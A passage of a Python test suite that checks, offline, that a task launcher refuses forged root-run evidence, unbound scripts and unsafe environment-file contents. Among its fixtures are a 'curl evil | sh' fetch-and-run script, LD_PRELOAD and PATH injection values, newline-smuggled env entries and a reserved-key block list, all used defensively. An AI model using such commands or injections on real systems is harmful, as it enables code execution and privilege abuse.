"""Source-only negative matrix for the trusted Root-run profile and its namespace policy.

Every test here is offline: systemd and subprocess are mocked or never reached,
no Root job is launched, no service is touched, no provider is called. These
tests prove the SOURCE contract only. They are not, and must not be read as,
runtime acceptance of a real Root cycle.
"""
import datetime
import hashlib
import os
import stat
import tempfile
import unittest
from pathlib import Path
from unittest.mock import MagicMock, patch

from launcher.task_profiles import (
    ROOT_RUN_ENV_ALLOWLIST,
    SourceValidationError,
    is_reserved_env_key,
    is_root_run_env_key_allowed,
    namespace_policy_for_profile,
    require_full_sha,
    require_full_sha256,
)
from launcher.task_units import (
    GENERIC_NAMESPACE_POLICY,
    ROOT_TRUSTED_NAMESPACE_POLICY,
    NamespacePolicy,
    TaskUnitAdmissionError,
    TrustedRootJobEvidence,
    _validated_env_lines,
    build_systemd_run_argv,
    resolve_namespace_policy,
)


def _future(minutes=30):
    return (
        datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(minutes=minutes)
    ).isoformat()


def _quse_ok():
    return {
        "zai": {
            "status": "ok",
            "windows": {
                "7d": {
                    "percent_remaining": 90.0,
                    "reset_at": _future(600),
                }
            },
        }
    }


class RootRunProfileTestCase(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.ws = Path(self.tmp.name)
        os.chmod(self.ws, 0o700)
        self.script = self.ws / "headless-root-run.sh"
        self.script.write_text("#!/bin/sh\nexit 0\n", encoding="utf-8")
        os.chmod(self.script, 0o700)
        self.script_sha = hashlib.sha256(self.script.read_bytes()).hexdigest()
        self.head_sha = "b" * 40

    def tearDown(self):
        self.tmp.cleanup()

    def evidence(self, **overrides):
        fields = {
            "job_id": "hub-job-7",
            "run_id": "run-20261014T1200Z",
            "lease_epoch": 4,
            "host_id": "hub-host-1",
            "session_id": "root-session-9",
            "script_path": str(self.script),
            "script_sha256": self.script_sha,
            "source_commit": self.head_sha,
            "auth_role": "hub-root-host",
            "expires_at": _future(),
        }
        fields.update(overrides)
        return TrustedRootJobEvidence(**fields)

    def private_env(self, **overrides):
        env = {
            "HR_RUN_ID": "run-20261014T1200Z",
            "HR_HUB_JOB_ID": "hub-job-7",
            "HR_HUB_LEASE_EPOCH": "4",
            "HUB_JOB_TOKEN": "hubt_secret_value_0001",
        }
        env.update(overrides)
        return env


class TestTrustedRootEvidence(RootRunProfileTestCase):
    def test_valid_evidence_has_no_denial_reason(self):
        self.assertIsNone(self.evidence().validate())

    def test_missing_identity_fields_denied(self):
        for field in ("job_id", "run_id", "host_id", "session_id"):
            with self.subTest(field=field):
                self.assertIsNotNone(self.evidence(**{field: ""}).validate())
                self.assertIsNotNone(self.evidence(**{field: "   "}).validate())

    def test_lease_epoch_zero_negative_bool_and_non_integer_denied(self):
        for bad in (0, -1, True, False, "4", 4.0, None):
            with self.subTest(lease_epoch=bad):
                reason = self.evidence(lease_epoch=bad).validate()
                self.assertTrue(
                    reason and reason.startswith("root-trusted-evidence"),
                    msg=f"lease_epoch={bad!r} produced {reason!r}",
                )

    def test_truncated_or_non_hex_script_digest_denied(self):
        for bad in ("a" * 63, "a" * 65, "z" * 64, "", "A" * 20, hashlib.sha1(b"x").hexdigest()):
            with self.subTest(script_sha256=bad):
                self.assertEqual(
                    self.evidence(script_sha256=bad).validate(),
                    "root-trusted-evidence-invalid-script-digest",
                )

    def test_non_full_source_commit_denied(self):
        for bad in ("c" * 12, "c" * 39, "c" * 64):
            with self.subTest(source_commit=bad):
                self.assertEqual(
                    self.evidence(source_commit=bad).validate(),
                    "root-trusted-evidence-invalid-source-commit",
                )

    def test_script_content_must_match_claimed_sha(self):
        self.script.write_text("#!/bin/sh\nexit 1\n", encoding="utf-8")
        self.assertEqual(
            self.evidence().validate(), "root-trusted-evidence-script-sha-mismatch"
        )

    def test_relative_non_executable_and_symlinked_script_denied(self):
        self.assertEqual(
            self.evidence(script_path="headless-root-run.sh").validate(),
            "root-trusted-evidence-script-path-not-absolute",
        )
        os.chmod(self.script, 0o600)
        self.assertEqual(
            self.evidence().validate(), "root-trusted-evidence-script-not-executable"
        )
        os.chmod(self.script, 0o700)
        link = self.ws / "link.sh"
        link.symlink_to(self.script)
        self.assertEqual(
            self.evidence(script_path=str(link)).validate(),
            "root-trusted-evidence-script-symlink-denied",
        )

    def test_missing_script_denied(self):
        self.assertEqual(
            self.evidence(script_path=str(self.ws / "absent.sh")).validate(),
            "root-trusted-evidence-script-unreadable",
        )

    def test_unsupported_auth_role_denied(self):
        self.assertEqual(
            self.evidence(auth_role="rootctl-head").validate(),
            "root-trusted-evidence-unsupported-auth-role",
        )

    def test_expired_and_unparsable_expiry_denied_fail_closed(self):
        self.assertEqual(
            self.evidence(expires_at="2020-01-01T00:00:00+00:00").validate(),
            "root-trusted-evidence-expired",
        )
        for bad in ("not-a-timestamp", "", "   "):
            with self.subTest(expires_at=bad):
                reason = self.evidence(expires_at=bad).validate()
                self.assertTrue(
                    reason and reason.startswith("root-trusted-evidence-missing")
                    or reason == "root-trusted-evidence-invalid-expiry",
                    msg=reason,
                )

    def test_expiry_boundary_is_exclusive(self):
        now = datetime.datetime.now(datetime.timezone.utc)
        exactly_now = now.isoformat()
        self.assertEqual(
            self.evidence(expires_at=exactly_now).validate(now_utc=now),
            "root-trusted-evidence-expired",
        )

    def test_impostor_and_subclass_are_rejected(self):
        class Forged(TrustedRootJobEvidence):
            pass

        impostor = Forged(**self.evidence().__dict__)
        policy = resolve_namespace_policy("root-run", trusted_root_evidence=impostor)
        self.assertEqual(policy.policy, "root-trusted-masked")
        self.assertTrue(policy.isolated_pid and policy.mask_native_services)

        duck = MagicMock()
        duck.__class__ = TrustedRootJobEvidence
        policy = resolve_namespace_policy("root-run", trusted_root_evidence=duck)
        self.assertEqual(policy.policy, "root-trusted-masked")


class TestNamespacePolicyResolution(RootRunProfileTestCase):
    def test_default_and_unauthorized_profiles_stay_generic(self):
        for profile in (None, "", "default", "model-task", "model-review", "cleanup"):
            with self.subTest(profile=profile):
                policy = resolve_namespace_policy(profile)
                self.assertIs(policy, GENERIC_NAMESPACE_POLICY)
                self.assertTrue(policy.isolated_pid and policy.mask_native_services)

    def test_unknown_profile_name_fails_closed(self):
        with self.assertRaises(ValueError):
            namespace_policy_for_profile("root-run-superuser")

    def test_root_run_without_evidence_is_fully_masked(self):
        policy = resolve_namespace_policy("root-run")
        self.assertEqual(policy.policy, "root-trusted-masked")
        self.assertEqual(policy.reason, "root-trusted-evidence-absent")
        self.assertTrue(policy.isolated_pid and policy.mask_native_services)

    def test_root_run_with_valid_evidence_and_wait_gets_host_pid(self):
        # HELD (F2): ProductionRootReceiver is unqualified, so even fully
        # valid self-minted evidence stays masked. Type/fields/hash alone are
        # never authority; only a genuinely minted object could unmask, and
        # none exists. Source guard only, not runtime readiness.
        from launcher.task_units import ROOT_TRUSTED_HELD_REASON
        policy = resolve_namespace_policy("root-run", trusted_root_evidence=self.evidence())
        self.assertEqual(policy.policy, "root-trusted-masked")
        self.assertTrue(policy.isolated_pid and policy.mask_native_services)
        self.assertEqual(policy.reason, ROOT_TRUSTED_HELD_REASON)

    def test_root_run_trusted_requires_synchronous_wait(self):
        policy = resolve_namespace_policy(
            "root-run",
            trusted_root_evidence=self.evidence(),
            require_synchronous_wait=False,
        )
        self.assertEqual(policy.policy, "root-trusted-masked")
        self.assertEqual(policy.reason, "root-trusted-requires-synchronous-wait")

    def test_each_denial_reason_maps_to_more_isolation(self):
        cases = {
            "run_id": "",
            "lease_epoch": 0,
            "script_sha256": "short",
            "auth_role": "nobody",
            "expires_at": "2020-01-01T00:00:00+00:00",
        }
        for field, bad in cases.items():
            with self.subTest(field=field):
                policy = resolve_namespace_policy(
                    "root-run", trusted_root_evidence=self.evidence(**{field: bad})
                )
                self.assertEqual(policy.policy, "root-trusted-masked")
                self.assertTrue(policy.isolated_pid and policy.mask_native_services)


class TestSystemdArgvNamespaceShape(RootRunProfileTestCase):
    def build(self, **kwargs):
        params = dict(
            unit_name="agent-task-root-1.service",
            command_argv=["/bin/sh", str(self.script)],
            memory_mb=1500,
            tmpdir=str(self.ws),
            workspace=str(self.ws),
            wait=True,
        )
        params.update(kwargs)
        return build_systemd_run_argv(**params)

    def test_generic_argv_is_byte_identical_without_new_arguments(self):
        argv = self.build()
        joined = " ".join(argv)
        self.assertIn("InaccessiblePaths=", joined)
        self.assertIn("-/run/user/%d/bus" % os.getuid(), joined)
        self.assertIn("NoNewPrivileges=yes", joined)
        self.assertIn("ProtectControlGroups=yes", joined)
        self.assertIn("/usr/bin/unshare", argv)
        self.assertIn("-p", argv)
        self.assertIn(f"MemoryMax=1500M", argv)
        self.assertIn("TasksMax=100", argv)
        self.assertIn("--", argv)
        self.assertEqual(argv[argv.index("--") + 1], "/usr/bin/unshare")

    def test_root_run_without_evidence_is_indistinguishable_from_generic(self):
        masked = self.build(profile="root-run")
        generic = self.build()
        self.assertEqual(masked, generic)
        masked_joined = " ".join(masked)
        self.assertIn("InaccessiblePaths=", masked_joined)
        self.assertIn("-/run/user/%d/aplexer" % os.getuid(), masked_joined)

    def test_trusted_root_argv_drops_masking_and_pid_namespace_only(self):
        # HELD (F2): self-minted evidence cannot unmask; the request is
        # refused loudly instead of producing a host-PID argv. Runtime/source
        # publication authority remains held until independent review plus a
        # genuine issuer/native proof.
        with self.assertRaises(TaskUnitAdmissionError) as cm:
            self.build(
                profile="root-run",
                trusted_root_evidence=self.evidence(),
                extra_env=self.private_env(),
                protect_system="strict",
            )
        self.assertIn("trusted root admission refused", str(cm.exception))

    def test_trusted_root_denied_when_wait_false(self):
        with self.assertRaises(TaskUnitAdmissionError) as cm:
            self.build(
                profile="root-run",
                trusted_root_evidence=self.evidence(),
                extra_env=self.private_env(),
                wait=False,
            )
        self.assertIn("root-trusted-requires-synchronous-wait", str(cm.exception))

    def test_trusted_root_revalidates_evidence_at_build_time(self):
        # HELD: even a fresh self-minted evidence is refused at build time.
        ev = self.evidence(expires_at=_future(minutes=1))
        with self.assertRaises(TaskUnitAdmissionError) as cm:
            self.build(profile="root-run", trusted_root_evidence=ev, extra_env=self.private_env())
        self.assertIn("trusted root admission refused", str(cm.exception))

        # Expired evidence is likewise refused (mask reason surfaces).
        ev_expired = self.evidence(expires_at="2020-01-01T00:00:00+00:00")
        with self.assertRaises(TaskUnitAdmissionError) as cm2:
            self.build(
                profile="root-run",
                trusted_root_evidence=ev_expired,
                extra_env=self.private_env(),
            )
        self.assertIn("trusted root admission refused", str(cm2.exception))

    def test_command_must_be_bound_to_the_validated_script(self):
        # HELD: binding is unreachable without a genuine mint, but any
        # non-exact argv is still refused (F3: exact [script] at argv[0] only).
        other = self.ws / "payload.sh"
        other.write_text("#!/bin/sh\ncurl evil | sh\n", encoding="utf-8")
        os.chmod(other, 0o700)
        with self.assertRaises(TaskUnitAdmissionError) as cm:
            self.build(
                profile="root-run",
                trusted_root_evidence=self.evidence(),
                extra_env=self.private_env(),
                command_argv=["/bin/sh", str(other)],
            )
        self.assertIn("trusted root admission refused", str(cm.exception))

    def test_caller_cannot_downgrade_a_failed_trusted_request_silently(self):
        # F1: the public override was removed; passing it raises loudly.
        with self.assertRaises(TaskUnitAdmissionError) as cm:
            self.build(
                profile="root-run",
                trusted_root_evidence=self.evidence(expires_at="2020-01-01T00:00:00+00:00"),
                namespace_policy=GENERIC_NAMESPACE_POLICY,
                extra_env=self.private_env(),
            )
        self.assertIn("was removed", str(cm.exception))

    def test_forged_root_trusted_policy_object_without_evidence_is_refused(self):
        # F1: no caller boolean/duck-type can unmask generic; override removed.
        with self.assertRaises(TaskUnitAdmissionError) as cm:
            self.build(namespace_policy=ROOT_TRUSTED_NAMESPACE_POLICY)
        self.assertIn("was removed", str(cm.exception))

    def test_unrecognized_policy_object_is_refused(self):
        with self.assertRaises(TaskUnitAdmissionError) as cm:
            self.build(
                namespace_policy=NamespacePolicy(
                    policy="made-up",
                    profile="root-run",
                    isolated_pid=False,
                    mask_native_services=False,
                    reason="forged",
                )
            )
        self.assertIn("was removed", str(cm.exception))

    def test_namespace_policy_override_removed_from_signature(self):
        import inspect
        from launcher import task_units
        self.assertNotIn("namespace_policy", inspect.signature(task_units.build_systemd_run_argv).parameters)

    def test_handbuilt_isolated_false_policy_cannot_unmask(self):
        # F1 P3/P3b/P3c: a hand-built generic-isolated policy with
        # isolated_pid=False / mask_native_services=False no longer exists as
        # a call path; any attempt raises.
        with self.assertRaises(TaskUnitAdmissionError):
            self.build(
                namespace_policy=NamespacePolicy(
                    policy="generic-isolated",
                    profile="generic",
                    isolated_pid=False,
                    mask_native_services=False,
                    reason="hand-built",
                )
            )


class TestPrivateEnvironmentTransport(RootRunProfileTestCase):
    def test_env_file_is_0600_and_outside_argv(self):
        # Generic transport still 0600 (F7: post-write mode verified).
        argv = build_systemd_run_argv(
            unit_name="agent-task-root-2.service",
            command_argv=["echo", "hi"],
            memory_mb=512,
            tmpdir=str(self.ws),
            workspace=str(self.ws),
            wait=True,
            extra_env={"SAFE_VAR": "value-1234"},
        )
        env_file = self.ws / "agent-task-root-2.service.env"
        self.assertTrue(env_file.exists())
        self.assertEqual(stat.S_IMODE(env_file.stat().st_mode), 0o600)
        content = env_file.read_text(encoding="utf-8")
        self.assertIn("SAFE_VAR=value-1234", content)
        self.assertNotIn("value-1234", " ".join(argv))
        self.assertIn(f"EnvironmentFile={env_file}", argv)
        env_file.unlink()

    def test_trusted_env_request_stays_held_even_with_valid_env(self):
        # HELD: a well-formed trusted request is still refused (no mint).
        with self.assertRaises(TaskUnitAdmissionError) as cm:
            build_systemd_run_argv(
                unit_name="agent-task-root-2b.service",
                command_argv=[str(self.script)],
                memory_mb=1500,
                tmpdir=str(self.ws),
                workspace=str(self.ws),
                wait=True,
                profile="root-run",
                trusted_root_evidence=self.evidence(),
                extra_env=self.private_env(),
            )
        self.assertIn("trusted root admission refused", str(cm.exception))
        self.assertFalse((self.ws / "agent-task-root-2b.service.env").exists())

    def test_borrowed_identity_is_refused(self):
        # HELD: refused before identity comparison, still no unmask and no leak.
        for key, bad in (
            ("HR_RUN_ID", "somebody-elses-run"),
            ("HR_HUB_JOB_ID", "hub-job-999"),
            ("HR_HUB_LEASE_EPOCH", "5"),
        ):
            with self.subTest(key=key):
                with self.assertRaises(TaskUnitAdmissionError) as cm:
                    build_systemd_run_argv(
                        unit_name="agent-task-root-3.service",
                        command_argv=[str(self.script)],
                        memory_mb=1500,
                        tmpdir=str(self.ws),
                        workspace=str(self.ws),
                        wait=True,
                        profile="root-run",
                        trusted_root_evidence=self.evidence(),
                        extra_env=self.private_env(**{key: bad}),
                    )
                self.assertIn("trusted root admission refused", str(cm.exception))
                self.assertFalse((self.ws / "agent-task-root-3.service.env").exists())

    def test_missing_identity_key_is_refused(self):
        env = self.private_env()
        env.pop("HR_RUN_ID")
        with self.assertRaises(TaskUnitAdmissionError) as cm:
            build_systemd_run_argv(
                unit_name="agent-task-root-4.service",
                command_argv=[str(self.script)],
                memory_mb=1500,
                tmpdir=str(self.ws),
                workspace=str(self.ws),
                wait=True,
                profile="root-run",
                trusted_root_evidence=self.evidence(),
                extra_env=env,
            )
        self.assertIn("trusted root admission refused", str(cm.exception))

    def test_non_allowlisted_key_refused_for_trusted_root(self):
        # Generic allowlist still enforced via _validated_env_lines with a
        # candidate policy is unreachable HELD; prove the allowlist helper
        # itself still denies non-listed keys for the trusted shape.
        from launcher.task_units import ROOT_TRUSTED_NAMESPACE_POLICY as _P
        with self.assertRaises(TaskUnitAdmissionError) as cm:
            _validated_env_lines(self.private_env(EVIL_VAR="1"), _P)
        self.assertIn("not on the root-run allowlist", str(cm.exception))

    def test_loader_injection_keys_refused_for_both_policies(self):
        for key in ("LD_PRELOAD", "LD_LIBRARY_PATH", "PYTHONSTARTUP", "PYTHONPATH", "BASH_ENV", "PATH", "IFS", "ENV"):
            with self.subTest(key=key):
                self.assertTrue(is_reserved_env_key(key))
                for policy in (GENERIC_NAMESPACE_POLICY, ROOT_TRUSTED_NAMESPACE_POLICY):
                    with self.assertRaises(TaskUnitAdmissionError) as cm:
                        _validated_env_lines({key: "/tmp/evil.so"}, policy)
                    self.assertIn("Reserved private environment key", str(cm.exception))

    def test_bad_key_charset_refused(self):
        for key in ("BAD KEY", "BAD-KEY", "1BAD", "BAD=KEY", ""):
            with self.subTest(key=key):
                with self.assertRaises(TaskUnitAdmissionError) as cm:
                    _validated_env_lines({key: "v"}, GENERIC_NAMESPACE_POLICY)
                self.assertIn("Invalid private environment key", str(cm.exception))

    def test_nul_and_newline_refused_without_silent_escaping(self):
        cases = [
            {"GOOD": "va\x00lue"},
            {"GOOD": "value\nsecond=line"},
            {"GOOD": "value\rreturn"},
            {"GOOD": "line1\nPATH=/evil"},
        ]
        for env in cases:
            with self.subTest(env=env):
                with self.assertRaises(TaskUnitAdmissionError) as cm:
                    _validated_env_lines(env, GENERIC_NAMESPACE_POLICY)
                self.assertTrue(
                    "NUL byte" in str(cm.exception) or "Newline" in str(cm.exception)
                )
                self.assertNotIn("/evil", str(cm.exception))

    def test_oversized_env_file_refused(self):
        big = {"BIG": "x" * (64 * 1024 + 16)}
        with self.assertRaises(TaskUnitAdmissionError) as cm:
            _validated_env_lines(big, GENERIC_NAMESPACE_POLICY)
        self.assertIn("ceiling", str(cm.exception))

    def test_trusted_root_requires_private_tmpdir(self):
        # HELD: refused (held reason) even before tmpdir privacy is reached;
        # generic privacy is covered by the generic symlink/mode tests below.
        # Keep a direct unit check that a world-writable dir is non-private for
        # the trusted shape via _assert_private_env_dir.
        from launcher.task_units import _assert_private_env_dir
        shared = Path(tempfile.mkdtemp())
        try:
            os.chmod(shared, 0o777)
            with self.assertRaises(TaskUnitAdmissionError) as cm:
                _assert_private_env_dir(shared, strict_private=True)
            self.assertIn("not private", str(cm.exception))
        finally:
            for child in shared.iterdir():
                child.unlink()
            os.chmod(shared, 0o700)
            shared.rmdir()

    def test_env_file_symlink_target_is_denied(self):
        target = self.ws / "target.env"
        target.write_text("owned=by-someone-else\n", encoding="utf-8")
        link = self.ws / "agent-task-root-7.service.env"
        link.symlink_to(target)
        with self.assertRaises(TaskUnitAdmissionError) as cm:
            build_systemd_run_argv(
                unit_name="agent-task-root-7.service",
                command_argv=["/bin/sh", str(self.script)],
                memory_mb=1500,
                tmpdir=str(self.ws),
                workspace=str(self.ws),
                wait=True,
                extra_env={"SAFE": "value"},
            )
        self.assertIn("symlink", str(cm.exception))
        self.assertEqual(target.read_text(encoding="utf-8"), "owned=by-someone-else\n")

    def test_allowlist_helpers_agree_with_declared_contract(self):
        for key in ("HR_RUN_ID", "HR_HUB_JOB_ID", "HR_HUB_LEASE_EPOCH", "HUB_JOB_TOKEN", "HUB_URL"):
            self.assertTrue(is_root_run_env_key_allowed(key), msg=key)
        for key in ("HOME", "PATH", "LD_PRELOAD", "HR_OTHER", "hub_job_id"):
            self.assertFalse(is_root_run_env_key_allowed(key), msg=key)
        self.assertIn("HR_RUN_ID", ROOT_RUN_ENV_ALLOWLIST)
        self.assertIn("HUB_JOB_TOKEN", ROOT_RUN_ENV_ALLOWLIST)


class TestFullShaRequirement(unittest.TestCase):
    def test_require_full_sha_accepts_exact_sha(self):
        sha = "d" * 40
        self.assertEqual(require_full_sha(sha.upper()), sha)
        self.assertEqual(require_full_sha(f"  {sha} "), sha)

    def test_require_full_sha_rejects_truncated_and_non_hex(self):
        for bad in ("a" * 39, "a" * 41, "g" * 40, "", "HEAD", None, 12345, b"a" * 40):
            with self.subTest(bad=bad):
                with self.assertRaises(SourceValidationError):
                    require_full_sha(bad)

    def test_require_full_sha256_rejects_truncated_and_non_hex(self):
        sha = hashlib.sha256(b"payload").hexdigest()
        self.assertEqual(require_full_sha256(sha.upper()), sha)
        for bad in ("a" * 63, "a" * 65, "z" * 64, "", None, hashlib.sha1(b"x").hexdigest()):
            with self.subTest(bad=bad):
                with self.assertRaises(SourceValidationError):
                    require_full_sha256(bad)

    def test_validate_source_commit_rejects_malformed_expected_sha(self):
        from launcher.task_profiles import validate_source_commit

        repo_dir = Path(__file__).resolve().parent.parent
        for bad in ("a" * 39, "zzzz", "HEAD"):
            with self.subTest(bad=bad):
                with self.assertRaises(SourceValidationError):
                    validate_source_commit(repo_dir, "HEAD", expected_full_sha=bad)


class TestTrustBoundaryFindingsF1F7(RootRunProfileTestCase):
    """Targeted offline regression tests for F1-F7 (source-only, finite)."""

    def test_f2_self_minted_evidence_never_unmasks(self):
        from launcher.task_units import ROOT_TRUSTED_HELD_REASON
        policy = resolve_namespace_policy("root-run", trusted_root_evidence=self.evidence())
        self.assertEqual(policy.policy, "root-trusted-masked")
        self.assertIn("held", policy.reason)
        self.assertEqual(policy.reason, ROOT_TRUSTED_HELD_REASON)

    def test_f2_excessive_ttl_denied(self):
        far = (datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(hours=5)).isoformat()
        reason = self.evidence(expires_at=far).validate()
        self.assertEqual(reason, "root-trusted-evidence-ttl-exceeds-maximum")

    def test_f3_interpreter_prefix_and_extra_argv_refused(self):
        # HELD branch refuses first, but the exact-[script] rule is also
        # enforced structurally: any multi-token argv cannot ride evidence.
        for argv in (
            ["/bin/sh", "-c", "id", str(self.script)],
            ["/bin/sh", str(self.script)],
            [str(self.script), "--extra"],
            ["relative.sh"],
        ):
            with self.subTest(argv=argv):
                with self.assertRaises(TaskUnitAdmissionError):
                    build_systemd_run_argv(
                        unit_name="agent-task-f3.service",
                        command_argv=argv,
                        memory_mb=1500,
                        tmpdir=str(self.ws),
                        workspace=str(self.ws),
                        wait=True,
                        profile="root-run",
                        trusted_root_evidence=self.evidence(),
                        extra_env=self.private_env(),
                    )
        self.assertFalse((self.ws / "agent-task-f3.service.env").exists())

    def test_f4_build_failure_leaves_no_env_file(self):
        with self.assertRaises(TaskUnitAdmissionError):
            build_systemd_run_argv(
                unit_name="agent-task-f4.service",
                command_argv=["echo", "hi"],
                memory_mb=256,
                tmpdir=str(self.ws),
                workspace="/nonexistent-workspace-f4",
                wait=True,
                extra_env={"SAFE": "value-1234"},
            )
        self.assertFalse((self.ws / "agent-task-f4.service.env").exists())

    def test_f4_wrap_failure_after_write_leaves_no_env_file(self):
        from unittest.mock import patch
        with patch("launcher.pid_isolation.wrap_command", side_effect=RuntimeError("unshare absent")):
            with self.assertRaises(Exception):
                build_systemd_run_argv(
                    unit_name="agent-task-f4b.service",
                    command_argv=["echo", "hi"],
                    memory_mb=256,
                    tmpdir=str(self.ws),
                    workspace=str(self.ws),
                    wait=True,
                    extra_env={"SAFE": "value-1234"},
                )
        self.assertFalse((self.ws / "agent-task-f4b.service.env").exists())

    def test_f5_key_newline_and_trailing_backslash_refused(self):
        for bad_key in ("PATH\n", "FOO\n", "A\r"):
            with self.subTest(bad_key=bad_key):
                with self.assertRaises(TaskUnitAdmissionError):
                    _validated_env_lines({bad_key: "v"}, GENERIC_NAMESPACE_POLICY)
        with self.assertRaises(TaskUnitAdmissionError) as cm:
            _validated_env_lines({"GOOD": "abc\\"}, GENERIC_NAMESPACE_POLICY)
        self.assertIn("trailing backslash", str(cm.exception))

    def test_f6_falsy_expected_sha_compared_not_skipped(self):
        from launcher.task_profiles import validate_source_commit
        repo_dir = Path(__file__).resolve().parent.parent
        for bad in ("", 0, [], b""):
            with self.subTest(bad=bad):
                with self.assertRaises(SourceValidationError):
                    validate_source_commit(repo_dir, "HEAD", expected_full_sha=bad)

    def test_f7_symlink_and_mode_guards_catch_mutants(self):
        # O_NOFOLLOW: a symlinked env target is denied and never overwritten.
        target = self.ws / "f7target.env"
        target.write_text("owned=by-someone-else\n", encoding="utf-8")
        link = self.ws / "agent-task-f7.service.env"
        if link.exists() or link.is_symlink():
            link.unlink()
        link.symlink_to(target)
        with self.assertRaises(TaskUnitAdmissionError) as cm:
            build_systemd_run_argv(
                unit_name="agent-task-f7.service",
                command_argv=["echo", "hi"],
                memory_mb=256,
                tmpdir=str(self.ws),
                workspace=str(self.ws),
                wait=True,
                extra_env={"SAFE": "value"},
            )
        self.assertIn("symlink", str(cm.exception))
        self.assertEqual(target.read_text(encoding="utf-8"), "owned=by-someone-else\n")
        link.unlink()
        # 0600: generic file is exactly 0600 even under a permissive umask.
        old_umask = os.umask(0o022)
        try:
            argv = build_systemd_run_argv(
                unit_name="agent-task-f7b.service",
                command_argv=["echo", "hi"],
                memory_mb=256,
                tmpdir=str(self.ws),
                workspace=str(self.ws),
                wait=True,
                extra_env={"SAFE": "value"},
            )
        finally:
            os.umask(old_umask)
        env_file = self.ws / "agent-task-f7b.service.env"
        self.assertEqual(stat.S_IMODE(env_file.stat().st_mode), 0o600)
        self.assertIn(f"EnvironmentFile={env_file}", argv)
        env_file.unlink()

    def test_r1_race_swap_symlink_after_precheck_blocked(self):
        # R1/M01 killer: a symlink swapped in AFTER the is_symlink() precheck
        # must still be blocked by O_NOFOLLOW, with the victim unmodified.
        # The precheck is forced to pass (is_symlink->False) while the real
        # filesystem still holds a symlink, exercising the race defense.
        victim = self.ws / "r1-victim.env"
        victim.write_text("owned=by-someone-else\n", encoding="utf-8")
        link = self.ws / "agent-task-r1race.service.env"
        try:
            if link.exists() or link.is_symlink():
                link.unlink()
            link.symlink_to(victim)
            with patch.object(Path, "is_symlink", return_value=False):
                with self.assertRaises(Exception):
                    build_systemd_run_argv(
                        unit_name="agent-task-r1race.service",
                        command_argv=["echo", "hi"],
                        memory_mb=256,
                        tmpdir=str(self.ws),
                        workspace=str(self.ws),
                        wait=True,
                        extra_env={"SAFE": "value-1234"},
                    )
            self.assertEqual(
                victim.read_text(encoding="utf-8"), "owned=by-someone-else\n"
            )
        finally:
            try:
                if link.is_symlink() or link.exists():
                    link.unlink()
            except Exception:
                pass

    def test_r1_wrongmode_fchmod_cleanup_negative(self):
        # R1/M02 killer: if the file does not end 0600, build must raise AND
        # remove the env file. Stub fchmod to weaken the mode to 0644.
        import os as _os

        real_fchmod = _os.fchmod

        def _weaken(fd, mode):
            return real_fchmod(fd, 0o644)

        with patch("launcher.task_units.os.fchmod", side_effect=_weaken):
            with self.assertRaises(TaskUnitAdmissionError) as cm:
                build_systemd_run_argv(
                    unit_name="agent-task-r1mode.service",
                    command_argv=["echo", "hi"],
                    memory_mb=256,
                    tmpdir=str(self.ws),
                    workspace=str(self.ws),
                    wait=True,
                    extra_env={"SAFE": "value-1234"},
                )
            self.assertIn("0600", str(cm.exception))
        self.assertFalse((self.ws / "agent-task-r1mode.service.env").exists())

    def test_r2_keyboardinterrupt_during_build_cleans_env_file(self):
        # R2: BaseException (KeyboardInterrupt) after the write must still
        # remove the token-bearing env file and re-raise the original.
        from launcher.task_units import build_systemd_run_argv as _build

        with patch(
            "launcher.pid_isolation.wrap_command",
            side_effect=KeyboardInterrupt("stop"),
        ):
            with self.assertRaises(KeyboardInterrupt):
                _build(
                    unit_name="agent-task-r2ki.service",
                    command_argv=["echo", "hi"],
                    memory_mb=256,
                    tmpdir=str(self.ws),
                    workspace=str(self.ws),
                    wait=True,
                    extra_env={"SAFE": "value-1234"},
                )
        self.assertFalse((self.ws / "agent-task-r2ki.service.env").exists())

    def test_r4_quote_characters_refused_in_env_values(self):
        # R4: systemd EnvironmentFile values are written raw; quotes could
        # merge entries under a systemd parser, so both kinds are refused.
        for bad in ('"abc', 'ab"cd', "ab'cd", "'lead", "trail'"):
            with self.subTest(bad=bad):
                with self.assertRaises(TaskUnitAdmissionError) as cm:
                    _validated_env_lines({"SAFE": bad}, GENERIC_NAMESPACE_POLICY)
                self.assertIn("quote", str(cm.exception))

    def test_r4_interpreter_reserved_prefixes_denied(self):
        # R4: interpreter start-up keys must never be transported (the prelude
        # runs under sys.executable).
        for key in (
            "PYTHONUSERBASE",
            "PYTHONBREAKPOINT",
            "PYTHONFOO",
            "PYTHONPATH",
            "LD_PRELOAD",
            "SYSTEMD_FOO",
        ):
            with self.subTest(key=key):
                self.assertTrue(is_reserved_env_key(key))
                with self.assertRaises(TaskUnitAdmissionError):
                    _validated_env_lines({key: "1"}, GENERIC_NAMESPACE_POLICY)

    def test_r3_unmask_branch_removed_default_deny(self):
        # R3: the unmask branch is removed; even fully valid constructed
        # evidence stays masked with the HELD reason. No in-process registry
        # can authorize unmasking.
        from launcher import task_units as _tu
        from launcher.task_units import ROOT_TRUSTED_HELD_REASON

        self.assertFalse(hasattr(_tu, "_TRUSTED_MINT_REGISTRY"))
        self.assertFalse(hasattr(_tu, "_is_genuinely_minted"))
        policy = resolve_namespace_policy(
            "root-run", trusted_root_evidence=self.evidence()
        )
        self.assertEqual(policy.policy, "root-trusted-masked")
        self.assertEqual(policy.reason, ROOT_TRUSTED_HELD_REASON)
        self.assertTrue(policy.isolated_pid and policy.mask_native_services)
        with self.assertRaises(TaskUnitAdmissionError) as cm:
            build_systemd_run_argv(
                unit_name="agent-task-r3held.service",
                command_argv=[str(self.script)],
                memory_mb=1500,
                tmpdir=str(self.ws),
                workspace=str(self.ws),
                wait=True,
                profile="root-run",
                trusted_root_evidence=self.evidence(),
                extra_env=self.private_env(),
            )
        self.assertIn("trusted root admission refused", str(cm.exception))
        self.assertFalse((self.ws / "agent-task-r3held.service.env").exists())

    def test_r5_prelude_removed_when_build_fails(self):
        # R5 (S1 isolation fix): execute and spawn are exercised with
        # DISTINCT task ids, so one path's cleanup cannot mask the other's
        # leak (the previous version reused "r5-prelude" for both calls, so
        # dropping the unlink in the execute path alone did not fail).
        from launcher import task_units as _tu

        for tid in ("r5-prelude-exec", "r5-prelude-spawn"):
            with self.subTest(task_id=tid):
                tmpdir = self.ws / ".local" / "tmp" / tid
                tmpdir.mkdir(parents=True, exist_ok=True)
                with patch(
                    "launcher.task_units.build_systemd_run_argv",
                    side_effect=TaskUnitAdmissionError("boom"),
                ):
                    with patch(
